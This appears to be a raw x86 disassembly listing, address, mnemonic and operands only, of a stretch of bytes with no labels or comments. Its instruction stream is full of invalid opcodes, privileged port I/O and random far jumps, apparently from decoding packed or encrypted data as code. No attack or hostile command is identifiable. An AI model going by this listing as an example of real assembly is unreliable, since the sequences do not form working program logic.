  418534:	imul   ebx,ecx,0x5
  418537:	and    bl,BYTE PTR [edi-0x47]
  41853a:	mov    eax,0x40263627
  41853f:	mov    ebx,0x29b9ec8c
  418544:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418545:	popa   
  418546:	loope  0x418567
  418548:	or     BYTE PTR [edi],0xcb
  41854b:	stos   DWORD PTR es:[edi],eax
  41854c:	pop    ebx
  41854d:	sbb    ecx,DWORD PTR [ebx]
  41854f:	jl     0x418541
  418551:	mov    ah,0xdc
  418553:	xchg   esp,eax
  418554:	aas    
  418555:	aad    0x36
  418557:	sub    BYTE PTR [ebp+0x5a769e76],bl
  41855d:	aad    0x3a
  41855f:	sti    
  418560:	hlt    
  418561:	xchg   ebx,eax
  418562:	cmp    edx,0xb699684a
  418568:	sar    BYTE PTR [ecx-0x3433d62b],cl
  41856e:	addr16 dec eax
  418570:	fstp   st(0)
  418572:	mov    ds:0xd4b47128,eax
  418577:	push   ds
  418578:	jnp    0x4185ee
  41857a:	mov    ebp,0x390c29d7
  41857f:	pushf  
  418580:	jp     0x418527
  418582:	and    bh,dh
  418584:	mov    dh,0x58
  418586:	add    BYTE PTR [ebx],ch
  418588:	xchg   ebx,edx
  41858a:	in     eax,0xbb
  41858c:	icebp  
  41858d:	push   ebp
  41858e:	mov    DWORD PTR ds:0x709bf6a6,ecx
  418594:	stc    
  418595:	aaa    
  418596:	inc    edi
  418597:	das    
  418598:	into   
  418599:	(bad)  
  41859a:	icebp  
  41859b:	popf   
  41859c:	xor    edx,ebx
  41859e:	pop    ds
  41859f:	inc    edi
  4185a0:	pop    edi
  4185a1:	inc    esp
  4185a2:	repnz sub bl,dh
  4185a5:	ins    DWORD PTR es:[edi],dx
  4185a6:	push   ecx
  4185a7:	mov    eax,0x8d5b49e1
  4185ac:	in     al,dx
  4185ad:	(bad)  
  4185af:	retf   
  4185b0:	cmp    DWORD PTR [ecx],ecx
  4185b2:	shl    DWORD PTR [ebp-0x579c005e],1
  4185b8:	and    ebx,DWORD PTR [ebp+0x1ddd0f79]
  4185be:	or     al,0x15
  4185c0:	mov    al,0xa6
  4185c2:	and    BYTE PTR [esi+edi*2-0x1f7f50da],dl
  4185c9:	bound  edx,QWORD PTR [esi-0x6d8c736b]
  4185cf:	adc    eax,0x61006a20
  4185d4:	push   esp
  4185d5:	adc    dh,0x9b
  4185d8:	out    dx,eax
  4185d9:	xor    DWORD PTR [edx+0x57],ebp
  4185dc:	iret   
  4185dd:	cmp    BYTE PTR [eax-0x78a84821],0xd3
  4185e4:	xlat   BYTE PTR ds:[ebx]
  4185e5:	jle    0x41865c
  4185e7:	test   BYTE PTR [ebx-0x18fcd682],bl
  4185ed:	dec    edi
  4185ee:	scas   eax,DWORD PTR es:[edi]
  4185ef:	pop    ebp
  4185f0:	mov    DWORD PTR [eax-0x283d7828],esp
  4185f6:	jl     0x418578
  4185f8:	mov    BYTE PTR [ebp-0x2c],dh
  4185fb:	aam    0x8e
  4185fd:	fcmovb st,st(6)
  4185ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418600:	push   ecx
  418601:	sbb    DWORD PTR [edx],edi
  418603:	fs dec ecx
  418605:	xchg   edx,eax
  418606:	xchg   ecx,eax
  418607:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418608:	jmp    0xbaa29d69
  41860d:	mov    al,0xf8
  41860f:	xor    ch,BYTE PTR [esi+0x53]
  418612:	xor    ebx,DWORD PTR [esi+eiz*1+0x7a9858bc]
  418619:	aam    0x59
  41861b:	cld    
  41861c:	enter  0x5823,0xef
  418620:	or     al,0xd4
  418622:	inc    edx
  418623:	pop    edi
  418624:	push   cs
  418625:	cmp    al,0xb0
  418627:	jbe    0x41862c
  418629:	bswap  edi
  41862b:	lea    ebx,[edx+ebp*2+0x7e]
  41862f:	dec    ecx
  418630:	aam    0xe2
  418632:	mov    ch,0x4b
  418634:	xchg   edi,eax
  418635:	pop    eax
  418636:	dec    ebp
  418637:	push   ds
  418638:	mov    ds:0xea457861,al
  41863d:	ja     0x41869d
  41863f:	cmp    bh,BYTE PTR [ebx-0x67989275]
  418645:	ret    0x1d28
  418648:	pop    esi
  418649:	adc    esp,DWORD PTR [si]
  41864c:	xor    al,0xa6
  41864e:	xor    eax,0xd308b1f4
  418653:	push   0xd3d4a474
  418658:	inc    ebx
  418659:	sub    sp,WORD PTR [eax]
  41865c:	retf   0x742b
  41865f:	fiadd  WORD PTR ds:0x1a49545b
  418665:	out    dx,eax
  418666:	jns    0x41862e
  418668:	pushf  
  418669:	scas   eax,DWORD PTR es:[edi]
  41866a:	push   esi
  41866b:	es icebp 
  41866d:	jl     0x418601
  41866f:	inc    eax
  418670:	and    edx,edi
  418672:	xlat   BYTE PTR ds:[ebx]
  418673:	xchg   esp,eax
  418674:	mov    dh,0x4e
  418676:	cdq    
  418677:	cli    
  418678:	repz out 0x5f,al
  41867b:	sub    al,0x65
  41867d:	xchg   edi,eax
  41867e:	ret    
  41867f:	out    0xe0,eax
  418681:	out    dx,al
  418682:	sub    eax,0x9d708c7b
  418687:	(bad)  
  418688:	inc    eax
  418689:	jbe    0x41865f
  41868b:	xor    BYTE PTR [edx-0x43],dl
  41868e:	or     eax,0x3967a9cf
  418693:	add    eax,0xfc773eea
  418698:	iret   
  418699:	inc    ebp
  41869a:	jg     0x418669
  41869c:	sub    ebx,ebx
  41869e:	mov    dh,0x7d
  4186a0:	xchg   esp,eax
  4186a1:	aaa    
  4186a2:	jno    0x41869c
  4186a4:	jp     0x418628
  4186a6:	xor    BYTE PTR [ecx],dh
  4186a8:	jmp    0x690f:0x34d252e2
  4186af:	push   ds
  4186b0:	sub    edi,DWORD PTR [ecx+0x3f]
  4186b3:	sbb    DWORD PTR [edi-0x5a],edx
  4186b6:	xchg   edi,eax
  4186b7:	sti    
  4186b8:	out    dx,al
  4186b9:	js     0x4186a5
  4186bb:	sbb    eax,DWORD PTR [edx-0x2073d57d]
  4186c1:	add    DWORD PTR [eax],ecx
  4186c3:	sub    BYTE PTR [esi-0x45],0x2
  4186c7:	inc    edi
  4186c8:	inc    ebx
  4186c9:	aas    
  4186ca:	(bad)  
  4186cb:	and    BYTE PTR [eax-0x66],ch
  4186ce:	(bad)  
  4186d0:	aad    0x70
  4186d2:	call   0x40a2ae87
  4186d7:	mov    eax,0xe767c3f3
  4186dc:	and    DWORD PTR [esi+ecx*8+0x47],eax
  4186e0:	push   eax
  4186e1:	add    BYTE PTR [edx+0x7e],dh
  4186e4:	retf   0x5ac2
  4186e7:	sti    
  4186e8:	popf   
  4186e9:	lahf   
  4186ea:	mov    esp,0x72153779
  4186ef:	jno    0x41870f
  4186f1:	std    
  4186f2:	xor    BYTE PTR [edx-0x57],bl
  4186f5:	xor    BYTE PTR [esp+edi*4],0xf9
  4186f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186fa:	lods   al,BYTE PTR ds:[esi]
  4186fb:	sbb    BYTE PTR [ebx-0x4a],bh
  4186fe:	mov    edx,0x85f31098
  418703:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418704:	mov    edx,0xb0bd686c
  418709:	les    ebp,FWORD PTR [edi]
  41870b:	mov    ds:0xe42bec33,al
  418710:	xchg   edx,eax
  418711:	out    dx,al
  418712:	xchg   BYTE PTR [edi-0x7d],dh
  418715:	pop    esi
  418716:	hlt    
  418717:	sub    ebp,DWORD PTR [edx]
  418719:	ss and edi,esi
  41871c:	dec    ecx
  41871d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41871e:	rcl    DWORD PTR [ebx],1
  418720:	xchg   esi,eax
  418721:	adc    DWORD PTR [eax-0x77],esp
  418724:	pop    eax
  418725:	jne    0x418702
  418727:	ror    cl,0xd4
  41872a:	sub    ebx,esi
  41872c:	push   0x47f04425
  418731:	or     esi,esp
  418733:	dec    edx
  418734:	cmc    
  418735:	xor    esi,DWORD PTR ds:0x14152bdb
  41873b:	push   esi
  41873c:	adc    al,0x1d
  41873e:	lahf   
  41873f:	retf   0x90e
  418742:	aam    0x5d
  418744:	aad    0x4d
  418746:	aas    
  418747:	cdq    
  418748:	sub    ebp,edi
  41874a:	xchg   edx,eax
  41874b:	ret    
  41874c:	cdq    
  41874d:	fcomi  st,st(2)
  41874f:	or     al,0x87
  418751:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418752:	pop    es
  418753:	sbb    bx,WORD PTR [ebx+ebp*1]
  418757:	stc    
  418758:	(bad)  
  418759:	aas    
  41875a:	add    dl,BYTE PTR [eax+0x1fc03a98]
  418760:	xor    DWORD PTR [edx-0x1e],edx
  418763:	nop
  418764:	sbb    eax,0x28f7b797
  418769:	in     eax,dx
  41876a:	pop    ss
  41876b:	hlt    
  41876c:	dec    esp
  41876d:	mov    cl,0x9b
  41876f:	jbe    0x418710
  418771:	dec    esi
  418772:	mov    esp,0x9bd8c320
  418777:	push   ecx
  418778:	test   al,0x83
  41877a:	inc    edx
  41877b:	xchg   edx,eax
  41877c:	inc    esi
  41877d:	xchg   edx,eax
  41877e:	in     al,0xdb
  418780:	jg     0x4187dd
  418782:	cmc    
  418783:	(bad)  
  418784:	scas   al,BYTE PTR es:[edi]
  418785:	dec    eax
  418786:	cwde   
  418787:	fs cdq 
  418789:	aad    0xf4
  41878b:	add    ah,BYTE PTR [esi+0x58]
  41878e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41878f:	or     eax,0x4e526fab
  418794:	mov    esi,DWORD PTR [eax]
  418796:	xor    BYTE PTR [edx],ch
  418798:	mov    es,WORD PTR [edi-0x4]
  41879b:	jae    0x418809
  41879d:	enter  0x94c4,0x57
  4187a1:	ss popa 
  4187a3:	cmp    dl,ch
  4187a5:	inc    esp
  4187a6:	inc    edi
  4187a7:	popf   
  4187a8:	sub    al,0x1
  4187aa:	out    dx,al
  4187ab:	pop    ebp
  4187ac:	push   ecx
  4187ad:	lods   eax,DWORD PTR ds:[esi]
  4187ae:	fnstsw WORD PTR [esi+0x54e0773d]
  4187b4:	fist   WORD PTR ds:0xcb8e6599
  4187ba:	pushf  
  4187bb:	add    BYTE PTR [edx],ch
  4187bd:	pusha  
  4187be:	(bad)  
  4187c0:	xor    eax,0x68
  4187c3:	or     al,0xc2
  4187c5:	sub    eax,0x682d01a0
  4187ca:	(bad)  
  4187cb:	retf   
  4187cc:	jb     0x41879f
  4187ce:	imul   esi,DWORD PTR [ebp-0x21],0xc4152d70
  4187d5:	push   cs
  4187d6:	mov    cl,0xfb
  4187d8:	mov    ecx,gs
  4187da:	cs repz clc 
  4187dd:	xchg   bl,ah
  4187df:	xor    al,0xf
  4187e2:	xor    bh,BYTE PTR [eax]
  4187e4:	dec    esi
  4187e6:	add    al,ch
  4187e8:	jmp    0x4187a0
  4187ea:	cdq    
  4187eb:	hlt    
  4187ec:	dec    DWORD PTR [ecx-0x62cc1d58]
  4187f2:	sbb    cl,bh
  4187f4:	xchg   ebp,eax
  4187f5:	inc    ecx
  4187f6:	jp     0x4187b1
  4187f8:	mov    ch,0xec
  4187fa:	jg     0x41885a
  4187fc:	dec    ebx
  4187fd:	and    dl,BYTE PTR [ebp-0x55415b65]
  418803:	fstp   QWORD PTR [eax-0x3c4d8daa]
  418809:	(bad)  
  41880a:	xchg   esi,eax
  41880b:	cmp    dl,BYTE PTR [ecx]
  41880d:	push   ecx
  41880e:	bndstx [esi],bnd2
  418811:	lds    ebx,FWORD PTR [esp+esi*8]
  418814:	jno    0x418869
  418816:	mov    BYTE PTR [ebx],ah
  418818:	test   al,0x2a
  41881a:	(bad)  
  41881b:	(bad)  
  41881c:	and    DWORD PTR [esi+ebp*1],edx
  41881f:	mul    DWORD PTR [edi-0x73]
  418822:	sbb    eax,0x21c2028f
  418827:	mov    ebx,0x3e64baae
  41882c:	retf   0x7b4c
  41882f:	jbe    0x418853
  418831:	pop    ebx
  418832:	sahf   
  418833:	lods   al,BYTE PTR ds:[esi]
  418834:	add    al,0x50
  418836:	lds    edx,FWORD PTR [edx]
  418838:	push   ds
  418839:	es das 
  41883b:	push   esp
  41883c:	lods   eax,DWORD PTR ds:[esi]
  41883d:	push   edx
  41883e:	jmp    0x41885d
  418840:	ds jle 0x418834
  418843:	test   eax,0xd907a5eb
  418848:	sbb    ebx,DWORD PTR [ecx-0x72]
  41884b:	cmp    ebx,DWORD PTR [ecx]
  41884d:	aas    
  41884e:	retf   0x24be
  418851:	jae    0x4187f5
  418853:	cmp    DWORD PTR [edi+0x6437c9b0],ebp
  418859:	jne    0x418803
  41885b:	pop    ebp
  41885c:	xchg   esp,eax
  41885d:	jle    0x418832
  41885f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418860:	out    dx,eax
  418861:	inc    ebp
  418862:	call   0xae7b:0xb5cccc3d
  418869:	retf   0x1e46
  41886c:	xor    DWORD PTR [ebx+eiz*1],ebx
  41886f:	adc    BYTE PTR [eax],al
  418871:	mov    ds:0x2fadcc9,al
  418876:	ins    BYTE PTR es:[edi],dx
  418877:	out    dx,al
  418878:	in     al,dx
  418879:	lea    edi,ds:0xcbbb50dc
  41887f:	jg     0x41884e
  418881:	inc    ebx
  418882:	lock xchg esi,eax
  418884:	aas    
  418885:	mov    ebx,0x4b302afa
  41888a:	retf   0x5618
  41888d:	add    DWORD PTR [ebp+0x433b4f36],ecx
  418893:	(bad)  
  418894:	jmp    0x4188af
  418896:	in     eax,0x24
  418898:	inc    edi
  418899:	scas   al,BYTE PTR es:[edi]
  41889a:	jp     0x4188f7
  41889c:	pop    ecx
  41889d:	jmp    0xf2680228
  4188a2:	lods   al,BYTE PTR ds:[esi]
  4188a3:	push   ebp
  4188a4:	xchg   ebp,eax
  4188a5:	cmp    eax,0x1d22ce21
  4188aa:	retf   
  4188ab:	call   0x12d6:0x27e9318e
  4188b2:	jno    0x418842
  4188b4:	jae    0x418859
  4188b6:	in     eax,0x56
  4188b8:	adc    dh,BYTE PTR [ebx]
  4188ba:	mov    ah,0xe7
  4188bc:	pop    ds
  4188bd:	inc    edi
  4188be:	xchg   esp,eax
  4188bf:	test   ah,0x57
  4188c2:	mov    bl,0x37
  4188c4:	stos   DWORD PTR es:[edi],eax
  4188c5:	es call 0x91b3:0xb6fd8e25
  4188cd:	jnp    0x4188c7
  4188cf:	aad    0xd3
  4188d1:	fidivr DWORD PTR [ebp-0x3ef2d996]
  4188d7:	or     bl,BYTE PTR [esi+0xd3596a4]
  4188dd:	cdq    
  4188de:	jmp    0x8f16:0xf28f5c1c
  4188e5:	test   BYTE PTR [ecx+ebx*4-0x607b067e],dh
  4188ec:	sbb    eax,0x849d6a00
  4188f1:	xor    ebx,ebx
  4188f3:	arpl   dx,si
  4188f5:	fcomp  st(0)
  4188f7:	in     eax,0x97
  4188f9:	mov    eax,0xa328aadc
  4188fe:	xchg   ebp,eax
  4188ff:	push   0x7c
  418901:	jo     0x418924
  418903:	or     al,0xd9
  418905:	xchg   ebx,eax
  418906:	outs   dx,BYTE PTR ds:[esi]
  418907:	or     BYTE PTR [esi-0x7b3d0c51],bh
  41890d:	fmul   st(6),st
  41890f:	scas   eax,DWORD PTR es:[edi]
  418910:	(bad)  
  418911:	xchg   edi,eax
  418912:	outs   dx,BYTE PTR ds:[esi]
  418913:	test   DWORD PTR [esi+0x3c102214],ebp
  418919:	retf   0xd3b4
  41891c:	jl     0x4188f9
  41891e:	lea    ebp,[edx]
  418920:	push   eax
  418921:	jb     0x41895e
  418923:	clc    
  418924:	daa    
  418925:	scas   eax,DWORD PTR es:[edi]
  418926:	fld    TBYTE PTR [ebx-0x3df05329]
  41892c:	imul   eax,DWORD PTR [edx+0xc],0xffffff97
  418930:	mov    eax,ds:0xce41807e
  418935:	mov    ebp,0x4a778257
  41893a:	mov    fs,WORD PTR [edx-0xef65203]
  418940:	adc    edx,DWORD PTR [esp+edi*8+0x1a]
  418944:	jmp    0xebff:0x399bdccf
  41894b:	test   al,0x4c
  41894d:	jmp    0x9c716b46
  418952:	rcl    DWORD PTR [ebx],1
  418954:	xor    al,0xea
  418956:	jg     0x4189d7
  418958:	add    ah,BYTE PTR [esi]
  41895a:	sbb    eax,0xebfca300
  41895f:	dec    ecx
  418960:	pop    esp
  418961:	pusha  
  418962:	test   BYTE PTR [esi+ebp*1],dl
  418965:	(bad)
  418968:	jno    0x41896a
  41896a:	or     esp,DWORD PTR [ecx+0x57]
  41896d:	or     BYTE PTR [edi-0x18b7cd99],ah
  418973:	cmc    
  418974:	popa   
  418975:	int    0x5d
  418977:	imul   ebp,DWORD PTR [eax],0xcfee5ece
  41897d:	or     BYTE PTR [edx-0x475a13c0],cl
  418983:	dec    edi
  418984:	xor    BYTE PTR [ecx-0x5e],dh
  418987:	jne    0x4189fe
  418989:	(bad)  
  41898a:	jae    0x4189fb
  41898c:	jmp    0x8116480a
  418991:	dec    esi
  418992:	aaa    
  418993:	inc    ebx
  418994:	bound  esp,QWORD PTR [ecx+edi*2-0x75e2fb4c]
  41899b:	addr16 push edx
  41899d:	nop
  41899e:	push   ecx
  41899f:	iret   
  4189a0:	jecxz  0x418976
  4189a2:	loopne 0x4189ad
  4189a4:	lea    edx,[edi-0x1e0c6492]
  4189aa:	cwde   
  4189ab:	jecxz  0x418a14
  4189ad:	mov    edx,0xae9eaa82
  4189b2:	xchg   edi,eax
  4189b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189b4:	mov    esp,0x385d87e6
  4189b9:	xor    BYTE PTR [esi+0x15246fa],ah
  4189bf:	imul   ebx,DWORD PTR [eax-0xeaebb29],0xffffff99
  4189c6:	push   eax
  4189c7:	mov    dh,0xad
  4189c9:	out    dx,eax
  4189ca:	mov    ah,0xfb
  4189cc:	repz xor cl,BYTE PTR [edi]
  4189cf:	pop    esi
  4189d0:	pop    edx
  4189d1:	scas   al,BYTE PTR es:[edi]
  4189d2:	mov    ah,0x6e
  4189d4:	addr16 retf 
  4189d6:	xor    al,dl
  4189d8:	mov    DWORD PTR ds:0x26c54de1,edi
  4189de:	and    DWORD PTR [eax+0x75],ebx
  4189e1:	dec    esp
  4189e2:	daa    
  4189e3:	jns    0x418a2c
  4189e5:	into   
  4189e6:	fwait
  4189e7:	inc    ebp
  4189e8:	aas    
  4189e9:	xchg   esp,eax
  4189ea:	ret    0x184
  4189ed:	xlat   BYTE PTR ds:[ebx]
  4189ee:	and    al,0xb6
  4189f0:	repz cmp eax,0x2bd5c86e
  4189f6:	neg    esi
  4189f8:	xor    BYTE PTR [edi],0xab
  4189fb:	cmp    al,0x80
  4189fd:	imul   edx,DWORD PTR ds:0x3493d41f,0x2077346f
  418a07:	nop
  418a08:	pop    ebp
  418a09:	retf   
  418a0a:	xchg   edi,eax
  418a0b:	xlat   BYTE PTR ds:[ebx]
  418a0c:	out    dx,al
  418a0d:	scas   al,BYTE PTR es:[edi]
  418a0e:	fs dec edx
  418a10:	adc    al,0x16
  418a12:	xchg   esi,eax
  418a13:	push   edx
  418a14:	pop    es
  418a15:	(bad)  
  418a16:	xlat   BYTE PTR ds:[ebx]
  418a17:	and    dl,BYTE PTR [esi+ebx*2-0x69]
  418a1b:	and    esi,DWORD PTR [esi+0x20]
  418a1e:	inc    ebp
  418a1f:	stos   DWORD PTR es:[edi],eax
  418a20:	mov    cl,0x9f
  418a22:	cld    
  418a23:	ret    
  418a24:	cmp    al,0x95
  418a26:	stos   BYTE PTR es:[edi],al
  418a27:	add    DWORD PTR [edi-0x77],edi
  418a2a:	daa    
  418a2b:	or     DWORD PTR [esi],ebx
  418a2d:	stos   BYTE PTR es:[edi],al
  418a2e:	adc    eax,0x3698e4cc
  418a33:	or     dh,BYTE PTR [ebx-0x44]
  418a36:	imul   ecx,DWORD PTR ds:0x9f48bfd6,0x4
  418a3d:	adc    esp,ecx
  418a3f:	sar    DWORD PTR [eiz*2-0x69a4d54b],cl
  418a46:	and    dl,ah
  418a48:	add    ch,BYTE PTR [edi]
  418a4a:	mov    ds:0x42c9739e,eax
  418a4f:	adc    bl,BYTE PTR [esi-0x497f0499]
  418a55:	xor    DWORD PTR [ebp+edx*2+0x2c],0xf84b8e00
  418a5d:	pusha  
  418a5e:	jp     0x418abd
  418a60:	mov    ebx,DWORD PTR [esi]
  418a62:	mov    cl,0x65
  418a64:	push   es
  418a65:	mov    bl,0x60
  418a67:	dec    esi
  418a68:	inc    esp
  418a69:	sub    DWORD PTR [edi],0x7076071
  418a6f:	inc    ecx
  418a70:	leave  
  418a71:	in     eax,0x53
  418a73:	fdivr  DWORD PTR [ecx+0x3f8e5302]
  418a79:	mov    edx,0x7d07d730
  418a7e:	sub    eax,0x319e97ef
  418a83:	add    DWORD PTR [edi],edx
  418a85:	jle    0x418a91
  418a87:	fimul  DWORD PTR [ecx-0x23a3285d]
  418a8d:	push   ebp
  418a8e:	jecxz  0x418a2e
  418a90:	xchg   esp,eax
  418a91:	std    
  418a92:	call   0x407e8684
  418a97:	test   DWORD PTR ds:0xded8f6cd,0xb89a9529
  418aa1:	xor    ebx,esi
  418aa3:	int3   
  418aa4:	mov    dl,0x29
  418aa6:	pop    ss
  418aa7:	sbb    DWORD PTR [esi+0x5a66f09],eax
  418aad:	mov    ah,BYTE PTR [esp+edi*4]
  418ab0:	shr    DWORD PTR [eax],0x8d
  418ab3:	sti    
  418ab4:	shr    DWORD PTR [ebp+0xb],1
  418ab7:	mov    eax,ebx
  418ab9:	pusha  
  418aba:	mov    dl,0x10
  418abc:	add    eax,0xe0049273
  418ac1:	dec    ebx
  418ac2:	lods   al,BYTE PTR ds:[esi]
  418ac3:	jnp    0x418b1b
  418ac5:	or     eax,0xd0813d00
  418aca:	call   DWORD PTR [ecx-0x178337fe]
  418ad0:	and    al,bl
  418ad2:	ja     0x418b20
  418ad4:	mov    esi,0xc4bbea39
  418ad9:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  418adb:	jecxz  0x418b38
  418add:	mov    esi,0x6f9cde3
  418ae2:	push   esi
  418ae3:	lock cmc 
  418ae5:	adc    al,BYTE PTR [eax]
  418ae7:	xchg   edi,eax
  418ae8:	mov    ebp,0xa3196237
  418aed:	(bad)  
  418aee:	mov    ch,0xab
  418af0:	das    
  418af1:	push   ebx
  418af2:	mov    bl,BYTE PTR [ecx-0x33ee1d7c]
  418af8:	(bad)  
  418afa:	cmp    DWORD PTR [ecx],ecx
  418afc:	imul   ebp,edx,0xffffffd1
  418aff:	xchg   BYTE PTR [ecx+ebp*1-0x3d],bh
  418b03:	jne    0x418b2e
  418b05:	ins    DWORD PTR es:[edi],dx
  418b06:	sbb    al,bl
  418b08:	pop    ebp
  418b09:	inc    eax
  418b0a:	stos   BYTE PTR es:[edi],al
  418b0b:	into   
  418b0c:	pop    ecx
  418b0d:	inc    esp
  418b0e:	mov    ecx,0xf7ddb7c4
  418b13:	xchg   ecx,eax
  418b14:	mov    ds:0xf6795e55,al
  418b19:	xor    al,0xa1
  418b1b:	mov    ds:0x90b9d15f,eax
  418b20:	dec    esp
  418b21:	or     eax,0x9e548ec7
  418b26:	jmp    0x418afd
  418b28:	dec    edx
  418b29:	in     al,0x7b
  418b2b:	jb     0x418ad9
  418b2d:	mov    ah,0x5a
  418b2f:	xchg   edi,eax
  418b30:	add    bl,0xb6
  418b33:	fiadd  DWORD PTR [ebp-0x37d6793d]
  418b39:	xor    dl,BYTE PTR [eax+0x26]
  418b3c:	shl    BYTE PTR [eax],1
  418b3e:	ss out dx,al
  418b40:	gs jno 0x418b54
  418b43:	sub    BYTE PTR [edi+edx*2-0xc],cl
  418b47:	(bad)  
  418b48:	fcmovu st,st(5)
  418b4a:	jo     0x418b37
  418b4c:	scas   al,BYTE PTR es:[edi]
  418b4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b4e:	imul   ebx,DWORD PTR [edx+0x43],0xffffff9b
  418b52:	jne    0x418b69
  418b54:	push   cs
  418b55:	xor    DWORD PTR [edi+0x13],ebp
  418b58:	in     al,dx
  418b59:	test   al,0x5c
  418b5b:	(bad)
  418b5e:	call   0xecdf:0xab447b91
  418b65:	mov    eax,0xbee17656
  418b6a:	arpl   WORD PTR [eax-0x2839a73f],ax
  418b70:	mov    ebx,0x5cbed83b
  418b75:	and    edi,DWORD PTR [ebx]
  418b77:	mov    bl,0x4
  418b79:	sub    DWORD PTR [edi-0x41],ecx
  418b7c:	mov    ecx,0xb0efba8e
  418b81:	(bad)  
  418b82:	and    dh,BYTE PTR [edx+0x14]
  418b85:	pop    ecx
  418b86:	push   ds
  418b87:	xchg   DWORD PTR [eax-0x2e],eax
  418b8a:	sub    al,BYTE PTR [eax+ebx*1+0x472a59f2]
  418b91:	mov    BYTE PTR [esi-0x3200d5fd],dl
  418b97:	pop    edx
  418b98:	imul   eax,DWORD PTR [eax+0x64],0x3
  418b9c:	sbb    DWORD PTR [edx-0x2f585115],edx
  418ba2:	or     cl,BYTE PTR [ebx+0x39e8f9e1]
  418ba8:	lods   eax,DWORD PTR ds:[esi]
  418ba9:	and    eax,0xa8381836
  418bae:	in     eax,0x6c
  418bb0:	mov    ah,0x7f
  418bb2:	dec    ax
  418bb4:	rol    edx,cl
  418bb6:	dec    esi
  418bb7:	imul   ebp,DWORD PTR [esi],0x60895f1c
  418bbd:	sbb    bl,al
  418bbf:	inc    edx
  418bc0:	call   0x24c0:0xc8085a5
  418bc7:	fwait
  418bc8:	jb     0x418bf3
  418bca:	xor    ecx,DWORD PTR [edx-0x47182ce1]
  418bd0:	mov    ds:0x9d816559,eax
  418bd5:	ja     0x418c0f
  418bd7:	ss cli 
  418bd9:	call   0x92a1:0x80439279
  418be0:	mov    ch,0x4b
  418be2:	jecxz  0x418bf7
  418be4:	shl    BYTE PTR [edx],cl
  418be6:	test   DWORD PTR [ebp-0x1386d1f3],ebp
  418bec:	not    BYTE PTR [eax-0x5b]
  418bef:	push   ds
  418bf0:	(bad)  
  418bf1:	int    0x5b
  418bf3:	sbb    DWORD PTR [edx+0x71],eax
  418bf6:	ds test cl,0x26
  418bfa:	clc    
  418bfb:	ja     0x418be6
  418bfd:	inc    eax
  418bfe:	mov    dl,BYTE PTR [edx+0x65]
  418c01:	dec    esp
  418c02:	lods   al,BYTE PTR ds:[esi]
  418c03:	sbb    al,0x60
  418c05:	add    eax,0xec702c9c
  418c0a:	enter  0x5a98,0x13
  418c0e:	mov    ebp,0xa563a554
  418c13:	(bad)  
  418c14:	loop   0x418c4f
  418c16:	inc    ebp
  418c17:	test   DWORD PTR [edi+0x7c],0xeaf2eb0
  418c1e:	xchg   esp,eax
  418c1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c20:	ss sbb edi,ecx
  418c23:	(bad)  
  418c24:	lods   eax,DWORD PTR ds:[esi]
  418c25:	aas    
  418c26:	std    
  418c27:	xor    BYTE PTR [ecx-0x7f],dl
  418c2a:	je     0x418bb4
  418c2c:	addr16 dec esi
  418c2e:	cli    
  418c2f:	pop    edi
  418c30:	test   BYTE PTR [esi-0x3af3b1b3],bh
  418c36:	sbb    DWORD PTR [ebx-0x581c78e],0x6e3149ec
  418c40:	add    ah,BYTE PTR [bp+di]
  418c43:	in     eax,0x95
  418c45:	fst    DWORD PTR [ecx]
  418c47:	loop   0x418c75
  418c49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c4a:	mov    bh,0xe4
  418c4c:	in     eax,dx
  418c4d:	xchg   DWORD PTR [esi+0x70297bf9],ebx
  418c53:	pop    ebx
  418c54:	xor    dl,BYTE PTR [edi-0x2fc60990]
  418c5a:	dec    esi
  418c5b:	in     eax,0xac
  418c5d:	mov    al,0x6d
  418c5f:	fimul  DWORD PTR [edx+ebp*4+0x28]
  418c63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c64:	jecxz  0x418bf7
  418c66:	fwait
  418c67:	cmp    al,0x48
  418c69:	cmp    eax,0xc653c298
  418c6e:	sbb    BYTE PTR [ebx],bh
  418c70:	or     BYTE PTR [edi],bl
  418c72:	fwait
  418c73:	push   ebx
  418c74:	jb     0x418ce0
  418c76:	fnstenv [esi-0x52]
  418c79:	or     DWORD PTR [esi],ebx
  418c7b:	mov    ah,0xca
  418c7d:	(bad)  
  418c7e:	and    al,BYTE PTR fs:[edx+0x7ae067fa]
  418c85:	dec    ebx
  418c86:	pop    ebp
  418c87:	sar    DWORD PTR [ebp+eax*8+0x5c],0x72
  418c8c:	fcom   DWORD PTR [esi]
  418c8e:	mov    BYTE PTR [eax+0x5c6cc2a9],0x74
  418c95:	jge    0x418c4d
  418c97:	mov    dh,0x75
  418c99:	xor    BYTE PTR [edx+0x63],bh
  418c9c:	out    0xc5,al
  418c9e:	sub    eax,0x5c7c8fa8
  418ca3:	pop    esi
  418ca4:	test   eax,0x149baab9
  418ca9:	mov    BYTE PTR [ebx-0x78],ch
  418cac:	add    DWORD PTR [ecx-0x2f],edx
  418caf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418cb0:	ja     0x418d2a
  418cb2:	mov    al,ds:0x11088ddd
  418cb7:	adc    DWORD PTR [eax+0x2d],esi
  418cba:	mov    ebx,0x6ed5224
  418cbf:	add    BYTE PTR [edi-0x1e],bl
  418cc2:	(bad)  
  418cc3:	lea    ecx,[ebx-0x41]
  418cc6:	jmp    0xc5f6:0xfbbfce94
  418ccd:	adc    bh,cl
  418ccf:	inc    ebx
  418cd0:	mov    cl,0x4f
  418cd2:	mov    dh,0xd3
  418cd4:	push   0xa
  418cd6:	ins    BYTE PTR es:[edi],dx
  418cd7:	xchg   ecx,eax
  418cd8:	retf   0x105
  418cdb:	xchg   BYTE PTR [ecx+0x7f],bh
  418cde:	imul   DWORD PTR [edx]
